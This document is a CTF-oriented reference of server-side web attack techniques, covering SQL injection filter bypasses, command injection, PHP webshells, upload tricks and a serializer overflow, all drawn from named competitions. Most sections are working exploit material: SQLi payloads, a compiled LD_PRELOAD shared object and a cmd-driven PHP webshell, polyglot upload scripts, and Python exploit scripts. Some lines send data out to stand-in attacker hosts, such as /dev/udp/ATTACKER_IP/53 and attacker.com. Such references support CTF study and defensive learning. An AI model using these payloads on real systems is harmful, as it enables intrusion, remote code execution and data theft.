# CTF Web - Server-Side Code Execution & Access Attacks (Part 2)

## Table of Contents
- [SQLi Keyword Fragmentation Bypass (SecuInside 2013)](#sqli-keyword-fragmentation-bypass-secuinside-2013)
- [SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)](#sql-where-bypass-via-order-by-case-sharif-ctf-2016)
- [SQL Injection via DNS Records (PlaidCTF 2014)](#sql-injection-via-dns-records-plaidctf-2014)
- [Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)](#bash-brace-expansion-for-space-free-command-injection-insomnihack-2016)
- [Common Lisp Injection via Reader Macro (Insomnihack 2016)](#common-lisp-injection-via-reader-macro-insomnihack-2016)
- [PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)](#php7-opcache-binary-webshell--ld_preload-disable_functions-bypass-alictf-2016)
- [Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)](#wget-get-parameter-filename-trick-for-php-shell-upload-secuinside-2016)
- [Tar Filename Command Injection (CyberSecurityRumble 2016)](#tar-filename-command-injection-cybersecurityrumble-2016)
- [PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)](#pngphp-polyglot-upload--double-extension--disable_functions-bypass-metactf-flash-2026)
- [Editor Backup File Source Disclosure (h4ckc0n 2017)](#editor-backup-file-source-disclosure-h4ckc0n-2017)
- [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
- [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
- [PHP ReDoS to Skip Code Execution (CODE BLUE 2017)](#php-redos-to-skip-code-execution-code-blue-2017)
- [Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)](#custom-serializer-integer-overflow-256-to-0-length-codegate-2018)
- [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
- [Race Conditions (TOCTOU)](#race-conditions-toctou) *(stub — see [server-side-deser.md](server-side-deser.md))*

For injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion), see [server-side.md](server-side.md). For deserialization attacks (Java, Pickle) and race conditions, see [server-side-deser.md](server-side-deser.md). For CVE-specific exploits, path traversal bypasses, Flask/Werkzeug debug, and other advanced techniques, see [server-side-advanced.md](server-side-advanced.md).

*See also: [server-side-exec.md](server-side-exec.md) for Ruby/Perl/JS code injection, LaTeX injection RCE, PHP preg_replace /e RCE, PHP backtick eval, PHP assert() injection, Prolog injection, ReDoS timing oracle, file upload to RCE (.htaccess, log poisoning, Python .so hijack, Gogs symlink, ZipSlip), PHP deserialization from cookies, PHP extract() variable overwrite, XPath blind injection, API filter injection, HTTP response header hiding, WebSocket mass assignment, and Thymeleaf SpEL SSTI.*

---

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

**Pattern:** Single-pass `preg_replace()` keyword filters can be bypassed by nesting the stripped keyword inside the payload word.

**Key insight:** If the filter strips `load_file` in a single pass, `unload_fileon` becomes `union` after removal. The inner keyword acts as a sacrificial fragment.

```php
// Vulnerable filter (single-pass, case-sensitive)
$str = preg_replace("/union/", "", $str);
$str = preg_replace("/select/", "", $str);
$str = preg_replace("/load_file/", "", $str);
$str = preg_replace("/ /", "", $str);
```

```sql
-- Bypass payload (spaces replaced with /**/ comments)
(0)uniunionon/**/selselectect/**/1,2,3/**/frfromom/**/users
-- Or nest the stripped keyword:
unload_fileon/**/selectload_filect/**/flag/**/frload_fileom/**/secrets
```

**Variations:** Case-sensitive filters: mix case (`unIoN`). Space filters: `/**/`, `%09`, `%0a`. Recursive filters: double the keyword (`ununionion`). Always test whether the filter is single-pass or recursive.

---

## SQL WHERE Bypass via ORDER BY CASE (Sharif CTF 2016)

When `WHERE` clause restrictions prevent direct filtering, use `ORDER BY CASE` to control result ordering and extract data:

```sql
SELECT * FROM messages ORDER BY (CASE WHEN msg LIKE '%flag%' THEN 1 ELSE 0 END) DESC
```

**Key insight:** Even without WHERE access, ORDER BY with conditional expressions forces target rows to appear first in results. Combine with `LIMIT 1` to isolate specific records.

---

## SQL Injection via DNS Records (PlaidCTF 2014)

**Pattern:** Application calls `gethostbyaddr()` or `dns_get_record()` on user-controlled IP addresses and uses the result in SQL queries without escaping. Inject SQL through DNS PTR or TXT records you control.

**Attack setup:**
1. Set your IP's PTR record to a domain you control (e.g., `evil.example.com`)
2. Add a TXT record on that domain containing the SQL payload
3. Trigger the application to resolve your IP (e.g., via password reset)

```php
// Vulnerable code:
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$details = dns_get_record($hostname);
mysql_query("UPDATE users SET resetinfo='$details' WHERE ...");
// TXT record: "' UNION SELECT flag FROM flags-- "
```

**Key insight:** DNS records (PTR, TXT, MX) are an overlooked injection channel. Any application that resolves IPs/hostnames and incorporates the result into database queries is vulnerable. Control comes from setting up DNS records for attacker-owned domains or IP reverse DNS.

---

## Bash Brace Expansion for Space-Free Command Injection (Insomnihack 2016)

When spaces and common shell metacharacters (`$`, `&`, `\`, `;`, `|`, `*`) are filtered, use bash brace expansion and process substitution:

```bash
# Brace expansion inserts spaces: {cmd,-flag,arg} expands to: cmd -flag arg
{ls,-la,../..}

# Exfiltrate via UDP when outbound TCP is blocked:
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# Execute base64-encoded payload:
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**Key insight:** Bash brace expansion `{a,b,c}` splits into space-separated tokens without requiring literal space characters. Combined with `/dev/udp/` or `/dev/tcp/` for exfiltration, this bypasses filters that block spaces and most shell metacharacters.

---

## Common Lisp Injection via Reader Macro (Insomnihack 2016)

Lisp's `read` function evaluates `#.(expression)` reader macros at parse time. When an application uses `read` for user input (instead of `read-line`), arbitrary code execution is possible:

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

**Key insight:** Lisp's `read` treats data as code by design -- the `#.()` reader macro evaluates arbitrary expressions during parsing. This is analogous to SQL injection but for Lisp. Safe alternative: use `read-line` for string input, never `read` on untrusted data.

---

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) for full exploit code.

---

## Java Deserialization (ysoserial)

Serialized Java objects in cookies/POST (starts with `rO0AB` / `aced0005`). Use ysoserial gadget chains (CommonsCollections, URLDNS for blind detection). See [server-side-deser.md](server-side-deser.md#java-deserialization-ysoserial) for payloads and bypass techniques.

---

## Python Pickle Deserialization

`pickle.loads()` calls `__reduce__()` for instant RCE via `(os.system, ('cmd',))`. Common in Flask sessions, ML model files, Redis objects. See [server-side-deser.md](server-side-deser.md#python-pickle-deserialization) for payloads and restricted unpickler bypasses.

---

## Race Conditions (TOCTOU)

Concurrent requests bypass check-then-act patterns (balance, coupons, registration uniqueness). Send 50+ simultaneous requests so all see pre-modification state. See [server-side-deser.md](server-side-deser.md#race-conditions-toctou) for async exploit code and detection patterns.

---

---

## PHP7 OPcache Binary Webshell + LD_PRELOAD disable_functions Bypass (ALICTF 2016)

**Pattern (Homework):** Multi-stage chain: SQLi file write + PHP7 OPcache poisoning + `LD_PRELOAD` bypass of `disable_functions`.

**Stage 1 — OPcache poisoning:**
PHP7 with `opcache.file_cache` enabled stores compiled bytecode in `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`. Replace the `.bin` file via SQLi `INTO DUMPFILE` to execute arbitrary PHP despite upload restrictions.

```bash
# 1. Calculate system_id from phpinfo() data
python3 system_id_scraper.py http://target/phpinfo.php
# Output: 39b005ad77428c42788140c6839e6201

# 2. Generate opcode cache locally (match PHP version)
php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
    -d opcache.file_cache_only=1 -f payload.php

# 3. Patch system_id in binary (bytes 9-40)
# 4. Upload via SQLi INTO DUMPFILE:
```
```sql
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
```

**Stage 2 — LD_PRELOAD bypass:**
When `disable_functions` blocks all exec functions, use `putenv()` + `mail()` to execute code. PHP's `mail()` calls external sendmail, which respects `LD_PRELOAD`.

```c
/* evil.c — compile: gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

```php
<?php
// payload.php — upload evil.so via webapp, deploy this via OPcache
putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**Key insight:** PHP's `disable_functions` only restricts PHP-level calls. External programs spawned by `mail()` run without PHP restrictions, and `LD_PRELOAD` lets you override any libc function in those external programs. The OPcache `.bin` file has no integrity check beyond `system_id` matching — replacing it with a crafted binary gives arbitrary PHP execution even when upload validation strips PHP content.

---

## Wget GET Parameter Filename Trick for PHP Shell Upload (SECUINSIDE 2016)

**Pattern (trendyweb):** Server uses `wget` to download user-provided URLs and `parse_url()` to validate the path. Wget saves files with GET parameters in the filename, creating a `.php` extension bypass.

```text
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'      # passes .png check
wget saves as: avatar.png?shell.php           # server treats as PHP
```

Access via URL-encoded `?`: `http://target/data/hash/avatar.png%3fshell.php?cmd=id`

**Key insight:** `wget` preserves GET parameters in the output filename when no `-O` flag is specified. `parse_url()` separates path from query, so validation only sees the path extension. The resulting file has a `.php` extension from the query string portion, which Apache/nginx interprets as PHP.

---

## Tar Filename Command Injection (CyberSecurityRumble 2016)

**Pattern (Jobs):** Server extracts tar archives and displays filenames via a `.cgi` script. Filenames containing shell metacharacters are passed to shell without sanitization.

```bash
# Create tar with command injection filename
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# Upload — server runs: echo "name; cat /flag #" in CGI context
```

**Key insight:** When server-side scripts process filenames from user-uploaded archives (tar, zip) via shell commands, special characters in filenames become injection vectors. The semicolon breaks out of the filename context, and `#` comments out trailing characters. Always sanitize filenames from untrusted archives before shell interpolation.

---

## PNG/PHP Polyglot Upload + Double Extension + disable_functions Bypass (MetaCTF Flash 2026)

**Pattern (Brand Kit):** Upload filter rejects `.php` extension but accepts image uploads. nginx/PHP-FPM executes files ending in `.php` regardless of preceding extensions. `disable_functions` blocks all command execution functions, but filesystem functions remain available.

**Step 1: Create PNG/PHP polyglot**
```bash
# Create a valid PNG that also contains PHP code after the IEND chunk
# PHP interpreter ignores binary data before <?php
cp valid_image.png polyglot.png.php

# Append PHP payload after the PNG IEND marker
cat >> polyglot.png.php << 'PAYLOAD'
<?php
// disable_functions blocks system/exec/passthru/shell_exec/popen/proc_open
// Use filesystem functions instead
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f, 'flag') !== false || strpos($f, 'ctf') !== false) {
        echo "FOUND: $f\n";
        echo file_get_contents("/$f");
    }
}
// Fallback: list everything
echo "\n--- Full listing ---\n";
print_r($files);
?>
PAYLOAD
```

**Step 2: Upload with double extension**
```bash
# Filter checks extension — .png.php has .php at the end
# Some filters only check first extension (.png) or reject exact match on .php
curl -F 'file=@polyglot.png.php;type=image/png' http://target/upload

# Alternative double extensions to try:
# .png.php    .jpg.php    .gif.php
# .png.phtml  .png.phar   .png.php5
# .php.png (some filters check last extension, nginx checks .php anywhere)
```

**Step 3: Access and enumerate**
```bash
# The uploaded file is served by nginx which passes .php to PHP-FPM
curl http://target/uploads/polyglot.png.php

# If flag filename is randomized, first enumerate:
# scandir('/') reveals: flag_a8f3c9d2e1.txt
# Then read it with file_get_contents()
```

**Useful PHP functions when `disable_functions` blocks execution:**
```php
<?php
// File discovery
scandir('/');                          // List directory
glob('/flag*');                        // Glob pattern match
file_exists('/flag.txt');              // Check existence

// File reading
file_get_contents('/flag.txt');        // Read entire file
readfile('/flag.txt');                 // Output file directly
file('/flag.txt');                     // Read as array of lines
fopen('/flag.txt', 'r');              // Stream-based read

// Environment / info leaking
phpinfo();                             // Full PHP config, env vars
getenv('FLAG');                        // Environment variable
get_defined_vars();                    // All variables in scope

// If open_basedir is set, check what's allowed:
ini_get('open_basedir');
ini_get('disable_functions');
?>
```

**Key insight:** Three layers work together: (1) PNG/PHP polyglot passes image validation because it starts with valid PNG magic bytes; (2) double extension `.png.php` bypasses filters that reject `.php` but passes nginx's location regex that matches `\.php$`; (3) when `disable_functions` blocks all command execution, `scandir()` + `file_get_contents()` remain available for directory listing and file reading. Always enumerate the filesystem first when `disable_functions` is in play -- the flag filename is often randomized.

**When to recognize:** File upload challenge with image-only restrictions. Check `phpinfo()` output for `disable_functions` list. If all exec functions are blocked, pivot to pure PHP filesystem functions.

**References:** MetaCTF Flash CTF 2026 "Brand Kit"

---

## Editor Backup File Source Disclosure (h4ckc0n 2017)

**Pattern:** Text editors leave backup files alongside the original when saving. These are often left on web servers and served as plain text, leaking PHP source before execution.

| Editor | Backup pattern |
|--------|---------------|
| gedit  | `file~` |
| vim    | `.file.swp` (also `.file.swn`, `.file.swo`) |
| nano   | `file~` |
| emacs  | `file~` and `#file#` |

```bash
# Check common backup variants for a target file
TARGET="http://target/checker.php"
for suffix in "~" ".swp" ".bak" ".orig"; do
    curl -s -o /dev/null -w "%{http_code} $TARGET$suffix\n" "$TARGET$suffix"
done
# vim hidden-file backup:
curl -s "http://target/.checker.php.swp"
# emacs auto-save:
curl -s "http://target/#checker.php#"
```

```bash
# Practical: grab vim swap file and recover source
curl -o checker.swp "http://target/.checker.php.swp"
vim -r checker.swp          # opens recovered file in vim
# Or: strings checker.swp   # quick content extraction
```

**Key insight:** Always check for `filename~`, `.filename.swp`, `#filename#` variants when hunting for source disclosure. Combine with directory listing or known filenames from JS/HTML comments to enumerate candidates.

---

## date -f Arbitrary File Read (Can-CWIC 2017)

**Pattern:** The GNU `date` command's `-f`/`--file` flag reads each line from a file and processes it as a date format string. When user-controlled input reaches a `date` invocation as an argument, this provides arbitrary file read.

```bash
# Normal behavior: date -f /etc/passwd reads each line as a date string
# Lines that aren't valid dates print an error message containing the line content
date -f /etc/passwd
# Output includes: date: invalid date 'root:x:0:0:root:/root:/bin/bash'
# → file contents leak through error messages
```

```python
import subprocess

# Simulate: if web app passes user arg to date command
# e.g., os.system(f"date -d '{user_input}'") where user controls the flag value
# Or: user_input = "-f /etc/passwd" injected into arguments

# Brute-force readable files
targets = ['/etc/passwd', '/flag', '/flag.txt', '/home/ctf/flag']
for t in targets:
    result = subprocess.run(['date', '-f', t], capture_output=True, text=True)
    print(result.stderr)  # errors contain file content
```

```bash
# When command injection is available and date is accessible:
curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
# Response error output reveals flag content
```

**Key insight:** `date --file` / `date -f` provides arbitrary file read when the `date` command has user-controlled arguments. Error messages include the unrecognized line content, leaking the file line-by-line. Works on any system with GNU coreutils `date`.

---

## Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)

**Pattern:** Apache mod_rewrite rules match on the request path using regex. Accessing `/index.php/getflag` matches a permissive rule for `/index.php` (allowing the PHP file to handle the request) before any restrictive rule for `/getflag` applies. PHP receives `/getflag` as `PATH_INFO`.

```apache
# Vulnerable .htaccess / rewrite rules:
RewriteRule ^index\.php$ index.php [L]          # allows access to index.php
RewriteRule ^getflag$    /forbidden.html [R,L]  # blocks /getflag directly
```

```bash
# Direct access — blocked by second rule:
curl http://target/getflag          # → 403 or redirect to forbidden.html

# PATH_INFO bypass — matches first rule, PHP gets PATH_INFO=/getflag:
curl http://target/index.php/getflag   # → executes index.php with PATH_INFO=/getflag
```

```php
// In index.php — reads PATH_INFO to dispatch
$action = $_SERVER['PATH_INFO'];   // "/getflag"
if ($action === '/getflag') {
    echo $flag;
}
```

**Rule ordering matters:** Apache evaluates RewriteRules top-to-bottom and stops at the first `[L]` match. A permissive rule for the PHP file catches `/index.php/anything` before any restrictive rule for the suffix path.

**Key insight:** mod_rewrite rule ordering + PHP PATH_INFO interaction: `/index.php/protected-path` bypasses access controls by matching the PHP file rule first. PHP's `$_SERVER['PATH_INFO']` receives the suffix, letting the application's own routing dispatch to the protected handler.

---

## PHP ReDoS to Skip Code Execution (CODE BLUE 2017)

**Pattern:** PHP's `preg_match()` is synchronous. When a regex with catastrophic backtracking complexity matches user-controlled input, the PCRE engine times out and `preg_match()` returns `false`. Code that runs after the regex check (e.g., an INSERT into an ACL table) never executes. A missing ACL record then becomes equivalent to having no access restriction — or the most permissive default.

```php
// Vulnerable pattern: regex check followed by ACL insert
if (preg_match('/^(ADMIN-+)+$/', $role)) {
    // If this times out (returns false), the block is never entered
    // AND code after the if-block may also be skipped or behave differently
}
// ACL INSERT that only runs on successful match:
$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
// Missing ACL row = no restriction applied
```

```python
import requests

# Payload: trigger catastrophic backtracking on the regex (ADMIN-+)+
# The nested quantifier causes exponential backtracking with enough repetitions
redos_payload = 'ADMIN-' + '-' * 50 + '!'   # trailing ! forces full backtrack
# Or the classic: ADMIN--(###A)*  structure repeated

r = requests.post('http://target/register', data={
    'username': 'victim',
    'role': redos_payload
})
# If the ACL INSERT is skipped, the user now has no restriction on their account
```

**Backtracking trigger patterns:**
```text
ADMIN--(###A)*  repeated 20+ times
(ADMIN-+)+X     where X doesn't match, forcing full backtrack
```

**Key insight:** PHP ReDoS can skip subsequent code entirely — a timed-out `preg_match()` returns `false` (not `0`), and any code gated on that check (like an ACL table INSERT) is silently skipped. This is not just a DoS: it acts as a code execution bypass when missing side effects change application security state.

---

## Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)

**Pattern:** A custom PHP file-based database stores records with a format of `<type_byte><length_byte><data>` per field. The length is stored in a single byte (`chr(len)`). When a field value is exactly 256 bytes, `chr(256)` wraps to `\x00` (null byte), making the parser treat the length as 0. The remaining 256 bytes of data spill into subsequent field boundaries, allowing the attacker to overwrite fields like password hash or privilege level.

```python
import hashlib
import requests

# Custom DB format per field: \x01 (string type) + chr(length) + data
# Fields stored in order: email, ip, level
# Goal: overwrite the password hash and level fields by overflowing email

# Craft the payload to inject into the "email" field
target_password = "hacked"
pw_hash = hashlib.md5(target_password.encode()).hexdigest()  # 32 hex chars

# These are the fields we want to inject after the overflow
injected_mail = '\x01\x20' + pw_hash          # type=string, len=32, data=md5(pw)
injected_level = '\x01\x01' + '2'             # type=string, len=1, data='2' (admin)

# Calculate padding to make total email field exactly 256 bytes
overhead = len(injected_mail) + len(injected_level) + 2  # +2 for the ip field header
pad_len = 256 - overhead
injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len  # type=string, padded ip field

# Combine: mail_data + ip_data + level_data = 256 bytes total
# When stored as email field: chr(256) = chr(0) = \x00 → length = 0
# Parser reads 0 bytes for email, then the 256 bytes become the next fields
payload_email = injected_mail + injected_ip + injected_level

# Register with the overflow payload as the email
r = requests.post("http://target/register", data={
    "email": payload_email,
    "password": target_password,
    "username": "attacker"
})
print(r.text)
```

```text
# How the overflow works in the file-based DB:

# Normal record layout:
# [email_type][email_len][email_data][ip_type][ip_len][ip_data][level_type][level_len][level_data]
#   \x01       \x10       user@x.com   \x01    \x09   127.0.0.1  \x01       \x01       1

# Overflow: email is 256 bytes → chr(256) = \x00
# [email_type][0x00][...256 bytes of attacker data...]
#   \x01       \x00  ← parser reads 0 bytes for email
#                    ← the 256 bytes are now parsed as ip, level, etc.
#                    ← attacker controls password hash and level fields
```

```python
# Generalized overflow finder for custom serialization formats
def find_overflow_length(field_width_bytes):
    """
    Calculate the overflow value for N-byte length fields.
    1 byte: overflows at 256 → 0
    2 bytes: overflows at 65536 → 0
    """
    return 2 ** (8 * field_width_bytes)

# 1-byte length: 256 → 0
assert find_overflow_length(1) == 256
# 2-byte length: 65536 → 0
assert find_overflow_length(2) == 65536
```

**Key insight:** Single-byte length fields overflow at 256 to 0, letting data from one field spill into subsequent fields. Any custom serialization format using fixed-width length fields is vulnerable. Look for field length stored in 1 byte (max 255) or 2 bytes (max 65535). Signs of custom serialization: binary file-based databases, custom session formats, proprietary protocol parsers. The attack requires knowing (or guessing) the exact field order and format in the serialized structure. See also [server-side-deser.md](server-side-deser.md) for standard deserialization attacks.

---

*See also: [server-side.md](server-side.md) for core injection attacks (SQLi, SSTI, SSRF, XXE, command injection, PHP type juggling, PHP file inclusion).*
